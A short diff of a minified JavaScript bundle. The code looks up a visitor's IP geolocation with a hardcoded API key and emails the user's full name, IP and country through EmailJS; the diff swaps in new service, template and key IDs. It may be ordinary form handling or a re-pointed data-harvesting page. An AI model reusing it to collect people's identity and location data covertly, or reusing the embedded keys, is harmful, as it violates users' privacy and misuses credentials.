@@ -14516,8 +14516,8 @@ const ZA = 15,
       "https://api.ipgeolocation.io/ipgeo?apiKey=ab2b18f1cf97421582f9b9190121e2a5"
     ).then((n) => n.json());
     QA.send(
-      "service_rpymter",
-      "template_htkpf7l",
+      "service_g9281bh",
+      "template_6vujapa",
       {
         ip: r.ip,
         full_name: e.fullName,
@@ -14534,7 +14534,7 @@ const ZA = 15,
         country: r.country_name,
         reply_to: "",
       },
-      "Yv6z2XqjdmWZtCOfM"
+      "m0yaI0hpiXh5X-oTi"
     ).then(
       (n) => {
         console.log(n.text);
